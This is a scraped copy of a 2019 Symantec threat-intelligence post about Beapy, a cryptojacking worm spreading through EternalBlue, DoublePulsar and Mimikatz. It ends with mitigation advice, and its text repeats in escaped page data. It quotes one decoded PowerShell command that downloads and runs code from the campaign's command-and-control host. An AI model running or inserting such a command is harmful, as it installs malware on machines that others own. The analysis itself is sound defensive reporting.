stroke-linejoin="round" d="m4 9 6.2 4.65a3 3 0 0 0 3.6 0L20 9"></path><path d="M3 9.177a2 2 0 0 1 1.029-1.749l7-3.888a2 2 0 0 1 1.942 0l7 3.888A2 2 0 0 1 21 9.177V17a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></g></svg></a></div></div></div></div></header></div><div class="page__body"><div id="main"><div class="main__wrapper"><div class="main__content"><main class="main__content"><a id="main-content" tabindex="-1"></a><div class="blog-post-page__top"></div><article class="container"><div class="blog-post-page"><div class="blog-post-page__content"><header class="blog-post-page__header"><h1 class="blog-post-page__title">Beapy: Cryptojacking Worm Hits Enterprises in China</h1><h2 class="blog-post-page__subtitle">Cryptojacking campaign we have dubbed Beapy is exploiting the EternalBlue exploit and primarily impacting enterprises in China.</h2><div class="metadata" aria-label="Article metadata"><ul class="metadata__list"><li 1.121z" clip-rule="evenodd"></path></svg></div>Threat Intelligence</a></li><li class="metadata__item">24 Apr 2019</li><li class="metadata__item">6<!-- --> Min Read</li></ul><a class="primary-button social-icon social-icon--linkedin" target="_blank" href="https://www.linkedin.com/cws/share?url=https%3A%2F%2Fwww.security.com%2Fthreat-intelligence%2Fbeapy-cryptojacking-worm-china&amp;token=&amp;isFramed=true">Share<svg xmlns="http://www.w3.org/2000/svg" fill="none" class="linkedin_svg__responsive-icon" viewBox="0 0 48 48"><g clip-path="url(#linkedin_svg__a)"><path fill="currentColor" d="M44.447 0H3.544C1.584 0 0 1.547 0 3.46V44.53C0 46.444 1.584 48 3.544 48h40.903C46.407 48 48 46.444 48 44.54V3.46C48 1.546 46.406 0 44.447 0M14.24 40.903H7.116V17.991h7.125zM10.678 14.87a4.127 4.127 0 0 1-4.134-4.125 4.127 4.127 0 0 1 4.134-4.125 4.125 4.125 0 0 1 0 8.25m30.225 26.034h-7.115V29.766c0-2.653-.047-6.075-3.704-6.075-3.703 0-4.265 2.896-4.265 5.887v11.325h-7.107V17.991h6.826v3.13h.093c.947-1.8 3.272-3.702 6.731-3.702 7.21 0 8.541 4.744 8.541 10.912z"></path></g><defs><clipPath id="linkedin_svg__a"><path fill="currentColor" d="M0 0h48v48H0z"></path></clipPath></defs></svg></a></div></header><div class="paragraph paragraph-rich-text prose"><p>Beapy is a cryptojacking campaign impacting enterprises that uses the EternalBlue exploit and stolen and hardcoded credentials to spread rapidly across networks. Beapy activity was first seen in Symantec telemetry in January 2019. This activity has also been seen on web servers and has been increasing since the beginning of March.</p>

<p>Beapy (<a href="https://www.symantec.com/security-center/writeup/2019-040311-4417-99">W32.Beapy</a>) is a file-based coinminer that uses email as an initial infection vector. This campaign demonstrates that while cryptojacking has declined in popularity with cyber criminals since its peak at the start of 2018, it is still a focus for some of them, with enterprises now their primary target.</p>

<p>Almost all of Beapy’s victims are enterprises (<em>Figure 1</em>). Beapy may indicate a continuation of a trend demonstrated by the Bluwimps worm (<a href="https://www.symantec.com/security-center/writeup/2018-020707-5228-99">MSH.Bluwimps</a>) in 2018 and which we mentioned in <a href="http://go.symantec.com/istr">ISTR 24</a>—an increased focus by cryptojacking criminals on enterprises. While we have no evidence these attacks are targeted, Beapy’s wormlike capabilities indicate that it was probably always intended to spread throughout enterprise networks.</p>
</div><div class="paragraph paragraph-image-inline prose"><figure class="paragraph-image-inline__figure"><img alt="Figure 1. Enterprise vs consumer infections of Beapy" loading="lazy" width="438" height="478" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DV2N7zd_n%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DaZ7eyiAi%202x&amp;w=640&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DV2N7zd_n%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DaZ7eyiAi%202x&amp;w=1080&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DV2N7zd_n%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25201.%2520Enterprise%2520vs%2520consumer%2520infections%2520of%2520Beapy.png.webp%3Fitok%3DaZ7eyiAi%202x&amp;w=1080&amp;q=75"/><figcaption class="paragraph-image-inline__caption">Figure 1. Enterprise vs consumer infections of Beapy</figcaption></figure></div><div class="paragraph paragraph-rich-text prose"><p>This mirrors a trend <a href="http://go.symantec.com/istr">we saw in ransomware in 2018 too</a> when, despite a drop in overall ransomware infections of 20 percent, ransomware infections in enterprises increased by 12 percent. Enterprises appear to be an increasing focus for cyber criminals.</p>

<p>Beapy is most heavily affecting enterprises in Asia, with more than 80 percent of its victims located in China, with other victims in South Korea, Japan, and Vietnam.</p>
</div><div class="paragraph paragraph-image-inline prose"><figure class="paragraph-image-inline__figure"><img alt="Figure 2. Beapy infections by region" loading="lazy" width="642" height="654" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DHCUuREJo%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DTtffeBrw%202x&amp;w=750&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DHCUuREJo%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DTtffeBrw%202x&amp;w=1920&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DHCUuREJo%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25202.%2520Beapy%2520infections%2520by%2520region.png.webp%3Fitok%3DTtffeBrw%202x&amp;w=1920&amp;q=75"/><figcaption class="paragraph-image-inline__caption">Figure 2. Beapy infections by region</figcaption></figure></div><div class="paragraph paragraph-rich-text prose"><h2>Infection chain</h2>

<p>Malicious emails are the initial vector for at least some Beapy infections. A malicious Excel document is delivered to victims as an email attachment. If the email recipient opens the malicious attachment, the DoublePulsar backdoor (<a href="https://www.symantec.com/security-center/writeup/2017-042122-0603-99">Backdoor.Doublepulsar</a>) is downloaded onto the target machine. DoublePulsar, like EternalBlue, was leaked in the Shadow Brokers dump and was also used in the destructive <a href="https://www.symantec.com/blogs/threat-intelligence/wannacry-ransomware-attack">WannaCry ransomware attack in 2017</a>. DoublePulsar opens a backdoor on infected machines and allows for remote code execution on compromised computers. EternalBlue exploits a vulnerability in the Windows SMB protocol to allow files to spread laterally across networks.</p>

<p>Once DoublePulsar is installed, a PowerShell command is executed, and contact is made with the Beapy command and control (C&amp;C) server, before a coinminer is downloaded onto the target computer. If we look at one example of a machine in Symantec telemetry, we see the earliest signs of suspicious activity on February 15, 2019, when the DoublePulsar backdoor is detected. We then see a PowerShell command being launched, which decodes to the following:</p>

<ul>
	<li><code>IEX (New-Object Net.WebClient).downloadstring('</code>http://v.beahh.com/v'<code>+$env:USERDOMAIN)</code></li>
</ul>

<p>This is the device contacting the Beapy C&amp;C server. Some more PowerShell commands are executed and then a Monero coinminer is downloaded. This process is repeated as Beapy spreads to other computers on the network.</p>

<p>Beapy appears to use unpatched machines to get a foothold on the network, and then uses EternalBlue to spread to other machines. However, EternalBlue isn’t Beapy’s only propagation technique, and it also uses the credential-stealing tool <a href="https://www.symantec.com/security-center/writeup/2012-042615-3731-99">Hacktool.Mimikatz</a> to attempt to collect credentials from infected computers. It can use those to spread to even patched machines on the network. Beapy also uses a hardcoded list of usernames and passwords to attempt to spread across networks. This is similar to how the Bluwimps worm operated. Bluwimps infected thousands of enterprise machines with coinminers in 2017 and 2018.</p>

<h2>Web servers</h2>

<p>Symantec telemetry also found an earlier version of Beapy on a public-facing web server, with the worm then attempting to spread to computers connected to that server. One of the ways it appears to do this is by generating a list of IP addresses it attempts to infect.</p>

<p>The version of Beapy seen on the web server is an early version of the malware, coded in C rather than Python, like later versions. However, the activity is similar, with the downloaded malware also containing Mimikatz modules for credential harvesting, as well as EternalBlue exploit capabilities.</p>

<p>In the web server compromise, Beapy also attempted to exploit an Apache Struts vulnerability (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>). This vulnerability was patched in 2017, but if successfully exploited it can allow for remote code execution. Beapy also tried to exploit known vulnerabilities in Apache Tomcat (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-12615">CVE-2017-12615</a>) and the Oracle WebLogic Server (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-10271">CVE-2017-10271</a>). In the case of this web server compromise observed by Symantec, exploit attempts began in early February, with connections to Beapy’s C&amp;C server first observed on March 13. Activity targeting this web server continued until early April.</p>

<p>In general, Beapy activity has been increasing since the beginning of March.</p>
</div><div class="paragraph paragraph-image-inline prose"><figure class="paragraph-image-inline__figure"><img alt="Figure 3. A sharp increase in Beapy detections is clearly visible" loading="lazy" width="1141" height="681" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DG-oxhh8y%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DfqeLB8rz%202x&amp;w=1200&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DG-oxhh8y%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DfqeLB8rz%202x&amp;w=3840&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DG-oxhh8y%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25203.%2520A%2520sharp%2520increase%2520in%2520Beapy%2520detections%2520is%2520clearly%2520visible.png.webp%3Fitok%3DfqeLB8rz%202x&amp;w=3840&amp;q=75"/><figcaption class="paragraph-image-inline__caption">Figure 3. A sharp increase in Beapy detections is clearly visible</figcaption></figure></div><div class="paragraph paragraph-rich-text prose"><h2>What does Beapy’s activity tell us?</h2>

<p>Despite the drop in <a>cryptojacking</a> activity in 2018, <a href="http://go.symantec.com/istr">when there was a 52 percent drop in cryptojacking</a>, this is still an area of interest for cyber criminals. Looking at the overall figures for cryptojacking, we can see that there were just under 3 million cryptojacking attempts in March 2019. While a big drop from the peak of February 2018, when there were 8 million cryptojacking attempts, it is still a significant figure.</p>
</div><div class="paragraph paragraph-image-inline prose"><figure class="paragraph-image-inline__figure"><img alt="Figure 4. Cryptojacking activity, January 2018 to March 2019" loading="lazy" width="697" height="421" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3D1deliiiL%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3DA2dw9G6n%202x&amp;w=750&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3D1deliiiL%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3DA2dw9G6n%202x&amp;w=1920&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3D1deliiiL%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25204.%2520Cryptojacking%2520activity%252C%2520January%25202018%2520to%2520March%25202019.png.webp%3Fitok%3DA2dw9G6n%202x&amp;w=1920&amp;q=75"/><figcaption class="paragraph-image-inline__caption">Figure 4. Cryptojacking activity, January 2018 to March 2019</figcaption></figure></div><div class="paragraph paragraph-rich-text prose"><p>Beapy is a file-based coinminer, which is interesting as most of the cryptojacking activity we saw at the height of its popularity <a href="https://www.symantec.com/blogs/threat-intelligence/browser-mining-cryptocurrency">was carried out using browser-based coinminers</a>, which were popular due to lower barriers to entry and because they allowed even fully patched machines to be targeted. The announcement that the Coinhive coin-mining service, which was launched in September 2017 and played a key role in the growth of cryptojacking, was closing down also probably contributed to the fall in browser-based cryptojacking. The service, which made it a lot easier for anyone to carry out browser-based coin mining, <a href="https://www.theverge.com/2019/2/28/18244636/coinhive-cryptojacking-cryptocurrency-mining-shut-down-monero-date">ceased operations at the start of March</a>. The shuttering of this service is likely to have a dramatic impact on browser-based cryptojacking.</p>

<p>As well as these factors, file-based coinminers also have a significant advantage over browser-based coinminers because they can mine cryptocurrency faster. The Monero cryptocurrency, which is the cryptocurrency most commonly mined during cryptojacking attacks, dropped in value by 90 percent in 2018, so it may make sense that miners that can create more cryptocurrency faster are now more popular with cyber criminals.</p>
</div><div class="paragraph paragraph-image-inline prose"><figure class="paragraph-image-inline__figure"><img alt="Figure 5. Comparing profitability of browser-based and file-based coin-mining botnets" loading="lazy" width="700" height="648" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3D8lX3XrvT%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3DAjjwyT0w%202x&amp;w=750&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3D8lX3XrvT%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3DAjjwyT0w%202x&amp;w=1920&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3D8lX3XrvT%201x%2C%20https%3A%2F%2Fwww.security.com%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_inline_medium_2x%2Fpublic%2F2019-04%2FFigure%25205.%2520Comparing%2520profitability%2520of%2520browser-based%2520and%2520file-based%2520coin-mining%2520botnets.jpg.webp%3Fitok%3DAjjwyT0w%202x&amp;w=1920&amp;q=75"/><figcaption class="paragraph-image-inline__caption">Figure 5. Comparing profitability of browser-based and file-based coin-mining botnets</figcaption></figure></div><div class="paragraph paragraph-rich-text prose"><h2>Effects of cryptojacking on enterprises</h2>

<p>While enterprises might think they don’t need to worry about cryptojacking as much as more disruptive threats such as ransomware, it could still have a major impact on the company’s operations.</p>

<p>Potential impacts of cryptojacking for businesses include:</p>

<ul>
	<li>A slowdown in devices’ performance, potentially leading to employee frustration and a reduction in productivity</li>
	<li>Overheating batteries</li>
	<li>Devices becoming degraded and unusable, leading to higher IT costs</li>
	<li>Increased costs due to increased electricity usage, and for businesses operating in the cloud that are billed based on CPU usage</li>
</ul>

<p>Enterprises need to ensure their networks are protected from the whole range of cyber security threats.</p>

<h2>Mitigation</h2>

<ul>
	<li>Emphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This includes deployment of endpoint, email, and web gateway protection technologies as well as firewalls and vulnerability assessment solutions. Always keep these security solutions up to date with the latest protection capabilities.</li>
	<li>Educate anyone using your device or network and urge them to exercise caution around emails from unfamiliar sources and around opening attachments that haven’t been solicited, which may contain file-based coin-mining malware.</li>
	<li>Educate employees about the signs that indicate their computer may have a coinminer and instruct them to inform IT immediately if they think there may be a coinminer on a device that is on the company network.</li>
	<li>Monitor battery usage on your device and, if you notice a suspicious spike in usage, scan it for the presence of any file-based miners.</li>
	<li>Install the latest patches on your devices, use strong passwords and enable two-factor authentication.</li>
</ul>

<h2>Protection</h2>

<p>Symantec has the following protection in place to protect customers against these kinds of attacks:</p>

<ul>
	<li><a href="https://www.symantec.com/security-center/writeup/2019-040311-4417-99">W32.Beapy</a></li>
	<li><a href="https://www.symantec.com/security-center/writeup/2012-042615-3731-99">Hacktool.Mimikatz</a></li>
	<li><a href="https://www.symantec.com/security-center/writeup/2018-020707-5228-99">MSH.Bluwimps</a></li>
	<li><a href="https://www.symantec.com/security-center/writeup/2017-042122-0603-99">Backdoor.Doublepulsar</a></li>
</ul>

<p>Symantec <a href="https://www.symantec.com/products/email-security-cloud">Email Security.cloud</a> technology blocks email&nbsp;spreading this threat using advanced heuristics.</p>

<h2>Further Reading</h2>

<p>For more information about cryptojacking, read our whitepaper:</p>

<ul>
	<li>&nbsp;<a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-cryptojacking-modern-cash-cow-en.pdf">Cryptojacking: A Modern Cash Cow</a></li>
</ul>

is a cryptojacking campaign impacting enterprises that uses the EternalBlue exploit and stolen and hardcoded credentials to spread rapidly across networks. Beapy activity was first seen in Symantec telemetry in January 2019. This activity has also been seen on web servers and has been increasing since the beginning of March.\u003c/p\u003e\r\n\r\n\u003cp\u003eBeapy (\u003ca href=\"https://www.symantec.com/security-center/writeup/2019-040311-4417-99\"\u003eW32.Beapy\u003c/a\u003e) is a file-based coinminer that uses email as an initial infection vector. This campaign demonstrates that while cryptojacking has declined in popularity with cyber criminals since its peak at the start of 2018, it is still a focus for some of them, with enterprises now their primary target.\u003c/p\u003e\r\n\r\n\u003cp\u003eAlmost all of Beapy’s victims are enterprises (\u003cem\u003eFigure 1\u003c/em\u003e). Beapy may indicate a continuation of a trend demonstrated by the Bluwimps worm (\u003ca href=\"https://www.symantec.com/security-center/writeup/2018-020707-5228-99\"\u003eMSH.Bluwimps\u003c/a\u003e) in 2018 and which we mentioned in \u003ca href=\"http://go.symantec.com/istr\"\u003eISTR 24\u003c/a\u003e—an increased focus by cryptojacking criminals on enterprises. While we have no evidence these attacks are targeted, Beapy’s wormlike capabilities indicate that it was probably always intended to spread throughout enterprise networks.\u003c/p\u003e\r\n11:Tf5b,\u003ch2\u003eInfection chain\u003c/h2\u003e\r\n\r\n\u003cp\u003eMalicious emails are the initial vector for at least some Beapy infections. A malicious Excel document is delivered to victims as an email attachment. If the email recipient opens the malicious attachment, the DoublePulsar backdoor (\u003ca href=\"https://www.symantec.com/security-center/writeup/2017-042122-0603-99\"\u003eBackdoor.Doublepulsar\u003c/a\u003e) is downloaded onto the target machine. DoublePulsar, like EternalBlue, was leaked in the Shadow Brokers dump and was also used in the destructive \u003ca href=\"https://www.symantec.com/blogs/threat-intelligence/wannacry-ransomware-attack\"\u003eWannaCry ransomware attack in 2017\u003c/a\u003e. DoublePulsar opens a backdoor on infected machines and allows for remote code execution on compromised computers. EternalBlue exploits a vulnerability in the Windows SMB protocol to allow files to spread laterally across networks.\u003c/p\u003e\r\n\r\n\u003cp\u003eOnce DoublePulsar is installed, a PowerShell command is executed, and contact is made with the Beapy command and control (C\u0026amp;C) server, before a coinminer is downloaded onto the target computer. If we look at one example of a machine in Symantec telemetry, we see the earliest signs of suspicious activity on February 15, 2019, when the DoublePulsar backdoor is detected. We then see a PowerShell command being launched, which decodes to the following:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u003ccode\u003eIEX (New-Object Net.WebClient).downloadstring('\u003c/code\u003ehttp://v.beahh.com/v'\u003ccode\u003e+$env:USERDOMAIN)\u003c/code\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eThis is the device contacting the Beapy C\u0026amp;C server. Some more PowerShell commands are executed and then a Monero coinminer is downloaded. This process is repeated as Beapy spreads to other computers on the network.\u003c/p\u003e\r\n\r\n\u003cp\u003eBeapy appears to use unpatched machines to get a foothold on the network, and then uses EternalBlue to spread to other machines. However, EternalBlue isn’t Beapy’s only propagation technique, and it also uses the credential-stealing tool \u003ca href=\"https://www.symantec.com/security-center/writeup/2012-042615-3731-99\"\u003eHacktool.Mimikatz\u003c/a\u003e to attempt to collect credentials from infected computers. It can use those to spread to even patched machines on the network. Beapy also uses a hardcoded list of usernames and passwords to attempt to spread across networks. This is similar to how the Bluwimps worm operated. Bluwimps infected thousands of enterprise machines with coinminers in 2017 and 2018.\u003c/p\u003e\r\n\r\n\u003ch2\u003eWeb servers\u003c/h2\u003e\r\n\r\n\u003cp\u003eSymantec telemetry also found an earlier version of Beapy on a public-facing web server, with the worm then attempting to spread to computers connected to that server. One of the ways it appears to do this is by generating a list of IP addresses it attempts to infect.\u003c/p\u003e\r\n\r\n\u003cp\u003eThe version of Beapy seen on the web server is an early version of the malware, coded in C rather than Python, like later versions. However, the activity is similar, with the downloaded malware also containing Mimikatz modules for credential harvesting, as well as EternalBlue exploit capabilities.\u003c/p\u003e\r\n\r\n\u003cp\u003eIn the web server compromise, Beapy also attempted to exploit an Apache Struts vulnerability (\u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\"\u003eCVE-2017-5638\u003c/a\u003e). This vulnerability was patched in 2017, but if successfully exploited it can allow for remote code execution. Beapy also tried to exploit known vulnerabilities in Apache Tomcat (\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-12615\"\u003eCVE-2017-12615\u003c/a\u003e) and the Oracle WebLogic Server (\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-10271\"\u003eCVE-2017-10271\u003c/a\u003e). In the case of this web server compromise observed by Symantec, exploit attempts began in early February, with connections to Beapy’s C\u0026amp;C server first observed on March 13. Activity targeting this web server continued until early April.\u003c/p\u003e\r\n\r\n\u003cp\u003eIn general, Beapy activity has been increasing since the beginning of March.\u003c/p\u003e\r\n12:T58e,\u003cp\u003eBeapy is a file-based coinminer, which is interesting as most of the cryptojacking activity we saw at the height of its popularity \u003ca href=\"https://www.symantec.com/blogs/threat-intelligence/browser-mining-cryptocurrency\"\u003ewas carried out using browser-based coinminers\u003c/a\u003e, which were popular due to lower barriers to entry and because they allowed even fully patched machines to be targeted. The announcement that the Coinhive coin-mining service, which was launched in September 2017 and played a key role in the growth of cryptojacking, was closing down also probably contributed to the fall in browser-based cryptojacking. The service, which made it a lot easier for anyone to carry out browser-based coin mining, \u003ca href=\"https://www.theverge.com/2019/2/28/18244636/coinhive-cryptojacking-cryptocurrency-mining-shut-down-monero-date\"\u003eceased operations at the start of March\u003c/a\u003e. The shuttering of this service is likely to have a dramatic impact on browser-based cryptojacking.\u003c/p\u003e\r\n\r\n\u003cp\u003eAs well as these factors, file-based coinminers also have a significant advantage over browser-based coinminers because they can mine cryptocurrency faster. The Monero cryptocurrency, which is the cryptocurrency most commonly mined during cryptojacking attacks, dropped in value by 90 percent in 2018, so it may make sense that miners that can create more cryptocurrency faster are now more popular with cyber criminals.\u003c/p\u003e\r\n13:Tc04,\u003ch2\u003eEffects of cryptojacking on enterprises\u003c/h2\u003e\r\n\r\n\u003cp\u003eWhile enterprises might think they don’t need to worry about cryptojacking as much as more disruptive threats such as ransomware, it could still have a major impact on the company’s operations.\u003c/p\u003e\r\n\r\n\u003cp\u003ePotential impacts of cryptojacking for businesses include:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003eA slowdown in devices’ performance, potentially leading to employee frustration and a reduction in productivity\u003c/li\u003e\r\n\t\u003cli\u003eOverheating batteries\u003c/li\u003e\r\n\t\u003cli\u003eDevices becoming degraded and unusable, leading to higher IT costs\u003c/li\u003e\r\n\t\u003cli\u003eIncreased costs due to increased electricity usage, and for businesses operating in the cloud that are billed based on CPU usage\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003eEnterprises need to ensure their networks are protected from the whole range of cyber security threats.\u003c/p\u003e\r\n\r\n\u003ch2\u003eMitigation\u003c/h2\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003eEmphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This includes deployment of endpoint, email, and web gateway protection technologies as well as firewalls and vulnerability assessment solutions. Always keep these security solutions up to date with the latest protection capabilities.\u003c/li\u003e\r\n\t\u003cli\u003eEducate anyone using your device or network and urge them to exercise caution around emails from unfamiliar sources and around opening attachments that haven’t been solicited, which may contain file-based coin-mining malware.\u003c/li\u003e\r\n\t\u003cli\u003eEducate employees about the signs that indicate their computer may have a coinminer and instruct them to inform IT immediately if they think there may be a coinminer on a device that is on the company network.\u003c/li\u003e\r\n\t\u003cli\u003eMonitor battery usage on your device and, if you notice a suspicious spike in usage, scan it for the presence of any file-based miners.\u003c/li\u003e\r\n\t\u003cli\u003eInstall the latest patches on your devices, use strong passwords and enable two-factor authentication.\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003ch2\u003eProtection\u003c/h2\u003e\r\n\r\n\u003cp\u003eSymantec has the following protection in place to protect customers against these kinds of attacks:\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u003ca 